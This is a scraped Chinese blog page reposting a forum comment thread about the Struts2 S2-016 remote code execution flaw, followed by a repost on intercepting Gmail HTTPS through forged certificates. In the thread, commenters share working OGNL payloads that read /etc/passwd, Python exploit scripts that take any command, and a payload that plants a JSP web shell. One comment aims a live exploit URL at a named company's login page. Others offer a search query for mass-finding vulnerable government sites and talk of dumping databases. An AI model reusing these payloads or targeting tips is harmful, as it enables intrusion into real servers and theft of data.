<li><a href="http://www.freebuf.com/?author=3486" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hackmissmiss" target="_blank">hackmissmiss </a> (1级)  <a href=""></a> 2013-07-17    24楼</li>
</ul>
<p>怎么构造WGET POC
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13030#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/free" target="_blank">free </a> (1级) 女人心看不透，因为胸前肉太厚。 <a href=""></a> 2013-07-17    25楼</li>
</ul>
<p>求工具啊
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13031#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> h4ck0r <a href=""></a> 2013-07-17    26楼</li>
</ul>
<p>执行任意命令：
example:python test.py <a href="http://baidu.com/test.action" target="_blank"><a href="http://baidu.com/test.action">http://baidu.com/test.action</a></a> cat /etc/passwd</p>
<p>import urllib2,sys,re</p>
<p>def get(url, data):
string = url + “?” + data
req = urllib2.Request(“%s”%string)
response = urllib2.urlopen(req).read().strip()
print strip(response)</p>
<p>def strip(str):
tmp = str.strip()
blank_line=re.compile(‘\x00′)
tmp=blank_line.sub(”,tmp)
return tmp</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>’:
url = sys.argv[1]
cmd = sys.argv[2]
cmd1 = sys.argv[3]
attack=”redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{‘%s’,&#39;%s’})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}”%(cmd,cmd1)
get(url,attack)
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13033#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> Hell0w0rld <a href=""></a> 2013-07-17</li>
</ul>
<p>@h4ck0r IndentationError: expected an indented block
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13035#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> coffee <a href=""></a> 2013-07-17    27楼</li>
</ul>
<p>我来个写shell的吧,当前目录生成test.jsp
?redirect:${
%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),
%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;),
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
}&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</p>
<p>然后用以下代码写shell:</p>
<p><form action="[http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post"></p>
<p><textarea >code</textarea></p>
<p><input type=submit value="提交">
</form>
上前目录生成1.jsp</p>
<p><a href="">亮了</a>(4)
<a href="http://www.freebuf.com/vuls/?replytocom=13034#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> apo <a href=""></a> 2013-07-18</li>
</ul>
<p>@coffee 我来个写shell的吧,当前目录生成test.jsp</p>
<p>?redirect:${
%23req%3d%23context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletRequest’),
%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;),
new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
}&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</p>
<p>然后用以下代码写shell:</p>
<p><form action="[http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&quot](http://www.***.jp/acdap/test.jsp?f=1.jsp"); method="post"></p>
<p><textarea name=t>code</textarea></p>
<p><input type=submit value="提交">
</form>
上前目录生成1.jsp</p>
<p>少了一个name=t <textarea name=t>code</textarea>
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13041#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> window <a href=""></a> 2013-07-18</li>
</ul>
<p>@apo 能生存test.jsp不能生成1.jsp啊！
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13042#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> apo <a href=""></a> 2013-07-18</li>
</ul>
<p>@window &lt;form action=&quot;<a href="http://www.***.jp/acdap/test.jsp?f=1.jsp&quot;" target="_blank"><a href="http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot">http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot</a></a>; method=&quot;post&quot;</p>
<p>楼主好像估计弄错两个地方。</p>
<p>这样就可以了。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13044#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> window <a href=""></a> 2013-07-18</li>
</ul>
<p>@apo 还是不能 ，
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13087#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> apo <a href=""></a> 2013-07-19</li>
</ul>
<p>@window
那我就没办法了。补补HTML知识。。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13094#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> tianya <a href=""></a> 2013-07-18    28楼</li>
</ul>
<p>就木有人发如何修复么？？？？？？？？？？？？？？？？？？？？？？？
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13036#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> sudnog <a href=""></a> 2013-07-18    29楼</li>
</ul>
<p>JSP如何拖库？数据库的配置文件一般是哪里？STRUTS2让我第一次有机会接触到了jsp~~求教各位！
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13038#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> Iamnothacker <a href=""></a> 2013-07-18    30楼</li>
</ul>
<p>用google发现了不少，确实可以批量抓了:
site:gov.cn inurl:index.action
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/vuls/?replytocom=13039#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> www <a href=""></a> 2013-07-18    31楼</li>
</ul>
<p>windows怎么搞？怎么wget
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13043#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> 抠脚大汉 <a href=""></a> 2013-07-18    32楼</li>
</ul>
<p><a href="http://hack.xiaoip.com/hack.php" target="_blank"><a href="http://hack.xiaoip.com/hack.php">http://hack.xiaoip.com/hack.php</a></a>
在线版漏洞利用工具放出~~~傻瓜化了。
<a href="">亮了</a>(4)
<a href="http://www.freebuf.com/vuls/?replytocom=13045#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3907" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hack" target="_blank">hack </a> (1级)  <a href=""></a> 2013-07-18    33楼</li>
</ul>
<p>求助，我用执行任意命令EXP,得到一个/etc/passwd后有什么用啊?还有叫执行任意命令,是指哪些命令能执行啊？求大牛为小菜解惑，入入门 <img src="" alt=":???:">
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13048#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3881" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/n0bele" target="_blank">n0bele </a> (1级)  <a href=""></a> 2013-07-18    34楼</li>
</ul>
<p>/etc/passwd用户名表
/etc/shadow密码
根据权限看命令范围
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13049#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3907" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hack" target="_blank">hack </a> (1级)  <a href=""></a> 2013-07-18    35楼</li>
</ul>
<p>哦，原理不是很懂，不过大概是清楚了，对了，这几个都是针对linux的，那不知道windows下是什么命令，我只记得是一个单词，if什么的好像，还是别的什么，记不起来了
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13050#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> anonymous <a href=""></a> 2013-07-18    36楼</li>
</ul>
<p>好多装逼青年在行动，连尼玛windows命令都不熟悉还日个JB。
<a href="">亮了</a>(5)
<a href="http://www.freebuf.com/vuls/?replytocom=13067#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> 222 <a href=""></a> 2013-07-18    37楼</li>
</ul>
<p>5555
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13068#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> 骑士 <a href=""></a> 2013-07-18    38楼</li>
</ul>
<p><a href="http://netknight.in/archives/436/" target="_blank"><a href="http://netknight.in/archives/436/">http://netknight.in/archives/436/</a></a>
利用工具在这我会乱说么
<a href="">亮了</a>(3)
<a href="http://www.freebuf.com/vuls/?replytocom=13091#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> z0mbie <a href=""></a> 2013-07-19    39楼</li>
</ul>
<p>请教各位，.do后缀名怎么入侵？
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13123#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1604" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/redcar" target="_blank">redcar </a> (1级)  <a href=""></a> 2013-07-20    40楼</li>
</ul>
<p>请问哪位知道这个redirect的功能是不是把%0a或者%0d过滤掉了？尝试了很多方法，返回的结果都是吧%0a和%0d给转换成了空格。因为看到了重定向，想尝试一下http分割响应，请问又什么绕过方法？
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13132#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3968" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/cwg2552298" target="_blank">cwg2552298 </a> (1级)  <a href=""></a> 2013-07-21    41楼</li>
</ul>
<p>Genius ！
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13142#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=645" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/藤真" target="_blank">藤真 </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FB达人"> (1级) 安信华攻防实验室成员 <a href=""></a> 2013-07-21    42楼</li>
</ul>
<p>php版利用工具 <a href="http://www.waitalone.cn/struts2-s2-16-exploits.html" target="_blank"><a href="http://www.waitalone.cn/struts2-s2-16-exploits.html">http://www.waitalone.cn/struts2-s2-16-exploits.html</a></a>
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13144#respond" target="_blank">回复</a>
昵称
(必须)您当前尚未登录。<a href="http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F11220.html" title="登陆" target="_blank">登陆</a>？注册</p>
<p>邮箱
必须(保密)</p>
<p>发表言论前，请滑动滚动条解锁
<a href="">表情</a><a href="">插代码</a><a href="">插图</a></p>
<p><a href="&quot;mrgreen&quot;"><img src="" alt=""></a><a href="&quot;razz&quot;"><img src="" alt=""></a><a href="&quot;sad&quot;"><img src="" alt=""></a><a href="&quot;smile&quot;"><img src="" alt=""></a><a href="&quot;oops&quot;"><img src="" alt=""></a><a href="&quot;grin&quot;"><img src="" alt=""></a><a href="&quot;eek&quot;"><img src="" alt=""></a><a href="&quot;???&quot;"><img src="" alt=""></a><a href="&quot;cool&quot;"><img src="" alt=""></a><a href="&quot;lol&quot;"><img src="" alt=""></a><a href="&quot;mad&quot;"><img src="" alt=""></a><a href="&quot;twisted&quot;"><img src="" alt=""></a><a href="&quot;roll&quot;"><img src="" alt=""></a><a href="&quot;wink&quot;"><img src="" alt=""></a><a href="&quot;idea&quot;"><img src="" alt=""></a><a href="&quot;arrow&quot;"><img src="" alt=""></a><a href="&quot;neutral&quot;"><img src="" alt=""></a><a href="&quot;cry&quot;"><img src="" alt=""></a><a href="&quot;?&quot;"><img src="" alt=""></a><a href="&quot;evil&quot;"><img src="" alt=""></a><a href="&quot;shock&quot;"><img src="" alt=""></a><a href="&quot;!&quot;"><img src="" alt=""></a>
正在提交, 请稍候...</p>
<p>/#</p>
<p><a href="">取消</a>   有人回复时邮件通知我</p>
<h3 id="-http-www-freebuf-com-donate-hot-comments-"><strong>本文这些评论亮了<img src="" alt=""><a href="http://www.freebuf.com/donate" target="_blank">捐助我们</a>**</strong>Hot Comments**</h3>
<p><a href="">X</a> @ 2013-07-17 15:57:23</p>
<p>?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
<a href="">亮了</a> (30) <a href="">命运</a> @ 2013-07-17 13:52:31</p>
<p>不息抢沙发好速度，话说乌云又有SB在刷分了。黑产的大好机会不把握，呵呵。
<a href="">亮了</a> (17) <a href="">fake</a> @ 2013-07-17 13:51:55</p>
<p><img src="http://static.freebuf.com/uploads/image/20130717/20130717015140_44183.png" alt=""> 乌云已经开始了……黑阔们拖库吧……
<a href="">亮了</a> (15) <a href="">生生不息</a> @ 2013-07-17 16:37:34</p>
<p><a href="https://kf.sf-express.com/css/loginmgmt/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}" target="_blank">https://kf.sf-express.com/css/loginmgmt/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}</a>
<a href="">亮了</a> (11) <a href="">hackmissmiss</a> @ 2013-07-17 14:02:05</p>
<p>刷你妈的分 一群小朋友 为了满足自己的虚荣心 不停的找网站刷分 SB
<a href="">亮了</a> (10) <a href="">uj70ky7b</a> @ 2013-07-17 15:52:24</p>
<p>刷你妹妹的分啊，能吃吗. 一分等于几万块啊。
<a href="">亮了</a> (8) <a href="">lock</a> @ 2013-07-17 17:58:10</p>
<p>import urllib2,getopt,sys def info(): print &quot;python struts.py -u <a href="http://baidu.com/test.action" target="_blank">http://baidu.com/test.action</a> -d whoami&quot; def get(url, data): string = url + &quot;?&quot; + data req = urllib2.Request(string) response = urllib2.urlopen(req) print response.read() if <strong>name</strong> == &#39;<strong>main</strong>&#39; and len(sys.argv) &lt; 2: info() try: opts, args = getopt.getopt(sys.argv[1:],&quot;u:d:&quot;) except: sys.exit(2) for opt, value in opts: if opt == &#39;-u&#39;: url = value elif opt == &#39;-d&#39;: test = value attack=&quot;?redirect:${/#a=(new java.lang.ProcessBuilder(&#39;%s&#39;)).start(),/#b=/#a.getInputStream(),/#c=new java.io.InputStreamReader(/#b),/#d=new java.io.BufferedReader(/#c),/#e=new char[50000],/#d.read(/#e),/#matt=/#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),/#matt.getWriter().println(/#e),/#matt.getWriter().flush(),/#matt.getWriter().close()}&quot;%test get(url,attack)
<a href="">亮了</a> (8) <a href="">n0bele</a> @ 2013-07-17 14:01:06</p>
<p>这真是个好厂商，没它黑帽子和那些又做黑产又做白帽子的帽子都快戴不稳了.
<a href="">亮了</a> (7) <a href="">z0mbie</a> @ 2013-07-17 14:44:12</p>
<p>小弟看不懂，哪位能给个执行命令的语句
<a href="">亮了</a> (7) <a href="">生生不息</a> @ 2013-07-17 13:47:58</p>
<p>目测利用工具马上出炉 POC来自官方： <a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank">http://struts.apache.org/release/2.3.x/docs/s2-016.html</a> <a href="http://struts.apache.org/release/2.3.x/docs/s2-017.htm" target="_blank">http://struts.apache.org/release/2.3.x/docs/s2-017.htm</a> 。。碉堡不
<a href="">亮了</a> (6)</p>
<h3 id="-new-posts-"><strong>最新发布**</strong>New Posts**</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/others-articles/11301.html" title="神马？关于大数据黑客的吐槽" target="_blank">神马？关于大数据黑客的吐槽</a></li>
<li><a href="http://www.freebuf.com/news/11336.html" title="研究人员称黑掉一张SIM卡只需几分钟" target="_blank">研究人员称黑掉一张SIM卡只需几分钟</a></li>
<li><a href="http://www.freebuf.com/articles/system/11305.html" title="WebServer端口重定向后门的研究" target="_blank">WebServer端口重定向后门的研究</a></li>
<li><a href="http://www.freebuf.com/news/11328.html" title="Ubuntu论坛，纳斯达克交易所网站遭黑客入侵" target="_blank">Ubuntu论坛，纳斯达克交易所网站遭黑客入侵</a></li>
<li><a href="http://www.freebuf.com/news/special/11326.html" title="[专题]Blackhat2013黑帽大会:五款值得一看的黑客工具" target="_blank">[专题]Blackhat2013黑帽大会:五款值得一看的黑客工具</a></li>
<li><a href="http://www.freebuf.com/news/11262.html" title="[专题]Blackhat2013第一天议题" target="_blank">[专题]Blackhat2013第一天议题</a></li>
<li><a href="http://www.freebuf.com/news/others/11063.html" title="有才！网友制作的Freebuf壁纸（更新）" target="_blank">有才！网友制作的Freebuf壁纸（更新）</a></li>
<li><a href="http://www.freebuf.com/news/11259.html" title="英国政府将调查华为在英网络安全中心" target="_blank">英国政府将调查华为在英网络安全中心</a></li>
<li><a href="http://www.freebuf.com/news/11258.html" title="HITCON2013台湾黑客年会，深入解析网络军事行动致命环节" target="_blank">HITCON2013台湾黑客年会，深入解析网络军事行动致命环节</a></li>
<li><p><a href="http://www.freebuf.com/news/11181.html" title="Facebook的漏洞可以让攻击者在分分钟内重置用户账户密码" target="_blank">Facebook的漏洞可以让攻击者在分分钟内重置用户账户密码</a></p>
<h3 id="-club-new-posts-"><strong>社区新帖**</strong>Club New Posts**</h3>
</li>
<li><p><a href="http://club.freebuf.com/?/question/403" title="zarp怎么运行？谢谢指教！" target="_blank">zarp怎么运行？谢谢指教！</a></p>
</li>
<li><a href="http://club.freebuf.com/?/question/402" title="期待FB打包hitcon 2013 PPT,让bufer们也学习下" target="_blank">期待FB打包hitcon 2013 PPT,让bufer们也学习下</a></li>
<li><a href="http://club.freebuf.com/?/question/401" title="弱弱的问一哈，咱们这有木有企鹅group" target="_blank">弱弱的问一哈，咱们这有木有企鹅group</a></li>
<li><a href="http://club.freebuf.com/?/question/400" title="求个EPATHOBJ 的EXP，能打64位系统的" target="_blank">求个EPATHOBJ 的EXP，能打64位系统的</a></li>
<li><a href="http://club.freebuf.com/?/question/399" title=" 使用sqlmap dump数据库的问题" target="_blank">使用sqlmap dump数据库的问题</a></li>
<li><a href="http://club.freebuf.com/?/question/398" title="能访问80端口其他都不能够，ping也不行" target="_blank">能访问80端口其他都不能够，ping也不行</a></li>
<li><a href="http://club.freebuf.com/?/question/397" title="WiFiPineApple资源[长期更新]" target="_blank">WiFiPineApple资源[长期更新]</a></li>
<li><a href="http://club.freebuf.com/?/question/396" title="[已更新]FREEBUF桌面两张附带psd" target="_blank">[已更新]FREEBUF桌面两张附带psd</a></li>
<li><a href="http://club.freebuf.com/?/question/395" title="FREEBUF桌面背景图片[高清]" target="_blank">FREEBUF桌面背景图片[高清]</a></li>
<li><a href="http://club.freebuf.com/?/question/394" title="求助//sqlmap汉字问题" target="_blank">求助//sqlmap汉字问题</a></li>
</ul>
<p><img src="" alt=""> 微信扫描上图订阅freebuf，每日精华文章推送。
All of the material and the informations available on freebuf. com is for informative purpose. freebuf.com declines all responsibilities from the damage that may be done of it, consequently it does not encourage who might use it for illegal purposes.</p>
<h3 id="freebuf-com">FREEBUF.COM</h3>
<p><a href="http://www.freebuf.com/dis" target="_blank">免责声明</a> <a href="http://www.freebuf.com/friends" target="_blank">友情链接</a> <a href="http://www.freebuf.com/newsend" target="_blank">我要投稿</a>
<a href="http://www.freebuf.com/others/864.html" target="_blank">关于我们</a> <a href="http://www.freebuf.com/partner" target="_blank">合作伙伴</a> <a href="http://www.freebuf.com/contact" target="_blank">联系我们</a></p>
<p>Copyright @ 2012 WWW.FREEBUF.COM All Rights Reserved
<a href=""></a> <a href="&quot;previous&quot;"></a><a href="&quot;next&quot;"></a></p>
<p>prev
next</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/struts&Java/">struts&Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/struts&Java/" class="label label-primary">struts&Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/">破解Google Gmail的https新思路</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-google-gmail-https-">破解Google Gmail的https新思路</h1>
<p>最近，Google针对<a href="http://www.williamlong.info/archives/2053.html" target="_blank">Gmail被攻击事件</a>，全面默认启用了始终以https访问Gmail的方式了。但是，对于可以动用整个国家力量的黑客来说，从网络通讯数据中（在此不讨论对用户电脑种木马破解https的情况，只讨论在网络通讯数据中破解https的方法）破解https除了暴力破解（暴力破解https即使按照现在的集群计算能力仍旧需要几百至几万年不等）之外真的别无他法了吗？事实并非如此。</p>
<p>我们知道，https的安全性主要是由SSL证书中的公钥和私钥来保证的。浏览器与服务器经过https建立通讯的时候（不考虑SSL代理方式需要用户提交证书的情况，因为我们现在讨论的是浏览器访问网站，和SSL代理无关）会按照以下步骤保证通讯的安全性：</p>
<p>1、浏览器连接服务器，服务器把SSL证书的公钥发送给浏览器</p>
<p>2、浏览器验证此证书中的域是否和访问的域一致（比如用户访问<a href="https://mail.google.com/时，浏览器验证服务器发送过来的SSL证书的公钥中的域是否为mail.google.com或/*.google.com）并没有过期" target="_blank">https://mail.google.com/时，浏览器验证服务器发送过来的SSL证书的公钥中的域是否为mail.google.com或/*.google.com）并没有过期</a></p>
<p>3、如果浏览器验证失败，浏览器通知用户证书有问题，让用户选择是否继续</p>
<p>4、如果浏览器验证成功，那么浏览器随机生成一个对称密钥并使用接收到的SSL证书的公钥进行加密并发送给服务器</p>
<p>5、服务器通过SSL证书的私钥对收到的信息进行解密并得到浏览器随机生成的对称密钥</p>
<p>6、最后服务器和浏览器都通过这个对称密钥进行通讯了（为什么不直接使用公钥和私钥进行通讯？因为非对称加密比对称加密效率低）</p>
<p>这个方案看似完美，却无法抵御中间人攻击，攻击者可以按以下步骤实施攻击截取https通讯中的所有数据：</p>
<p>1、攻击者伪造一个Gmail的SSL证书，使其中的域为mail.google.com或/*.google.com，并设置合适的证书过期时间</p>
<p>2、攻击者等待访问者的浏览器访问Gmail时，通过DNS劫持或IP伪造（对于有路由器控制权限的黑客来说简直轻而易举）的方法使其访问到攻击者的服务器上</p>
<p>3、攻击者把伪造的SSL证书公钥发送给浏览器</p>
<p>4、浏览器验证SSL证书的域和过期时间都没错，认为访问到的就是Gmail本身，从而把对称密钥发送给黑客服务器</p>
<p>5、黑客服务器把伪造的Gmail网页通过收到的对称密钥加密后发送给浏览器</p>
<p>6、访问者通过浏览器输入Gmail帐户，发送给黑客服务器，黑客服务器通过收到的对称密钥解密后成功获得访问者的Gmail密码</p>
<p>为了抵御这种中间人攻击，SSL证书需要由可信的SSL证书颁发机构颁发，形成一个证书链（比如Gmail的证书链为：最底层为网域mail.google.com，上一层为Thawte SGC CA证书颁发机构，最顶层为很有名的VeriSign证书颁发机构）。那么，浏览器除了需要验证域和有效期外，还要检查证书链中的上级证书公钥是否有效，上级的上级证书公钥是否有效，直至根证书公钥为止。这样就可以有效避免中间人攻击了，因为根证书公钥都是预装在操作系统中的，黑客如果不是暴力破解，无法得到根证书的私钥，如果黑客自己生成一个私钥，浏览器验证根证书公钥的时候发现无法通过操作系统中预装的公钥加密数据后使用这个私钥进行解密，从而判定这个公钥是无效的。这个方案也是现在https通讯通常的方案。</p>
<p>那么，这个现在所有的浏览器正在使用的https通讯方案就无懈可击了吗？答案仍是否定的。我们可以看到，在后一个方案中，https的安全性需要在证书颁发机构公信力的强有力保障前提下才能发挥作用。如果证书颁发机构在没有验证黑客为mail.google.com的持游者的情况下，给黑客颁发了网域为mail.google.com的证书，那么黑客的中间人攻击又可以顺利实施：</p>
<p>1、攻击者从一家不验证mail.google.com持有者的SSL证书颁发机构WoSign那里得到了网域为mail.google.com的证书，此证书的证书链为：最底层为网域mail.google.com，上一层证书颁发机构为WoSign，顶层证书颁发机构为VeriSign</p>
<p>2/3、第二、第三个步骤同上一个方案的中间人攻击的第二、第三个步骤</p>
<p>4、浏览器验证SSL证书的域和过期时间都没错，继续验证证书链：</p>
<p>4.1、最底层的网域mail.google.com证书公钥不在操作系统中，无法验证其访问到的就是Gmail本身，继续验证上一层证书颁发机构</p>
<p>4.2、上一层证书颁发机构WoSign的公钥也不在操作系统中，仍旧无法验证其有效性，继续验证上一层证书颁发机构</p>
<p>4.3、浏览器看到顶层证书颁发机构VeriSign的公钥在操作系统中，认为证书链有效，从而把对称密钥发送给黑客服务器</p>
<p>5/6、第五、第六个步骤同上一个方案的中间人攻击的第五、第六个步骤。黑客成功获得访问者的Gmail密码</p>
<p>然而，不验证域名持有者就颁发证书的情况在国外几乎不会发生，但是在国内就不一定了。针对破解目标，国内证书颁发机构WoSign（在此只是举例国内比较有名的证书颁发机构WoSign，并不代表WoSign今后一定会这么做）很有可能为了上级要求颁发了证书给非域名持有者的黑客，从而使得破解目标的Gmail密码被黑客截取。</p>
<p>那么，国内的破解目标是不是使用https的Gmail也无法保证安全了呢？欢迎与我进行探讨。
来源： <a href="[http://www.williamlong.info/archives/2058.html](http://www.williamlong.info/archives/2058.html)">[http://www.williamlong.info/archives/2058.html](http://www.williamlong.info/archives/2058.html)</a> </p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--破解GoogleGmail的https新思路/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--破解GoogleGmail的https新思路" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--电信数据网安全评估准则的研究/">电信数据网安全评估准则的研究</a></h1>
      
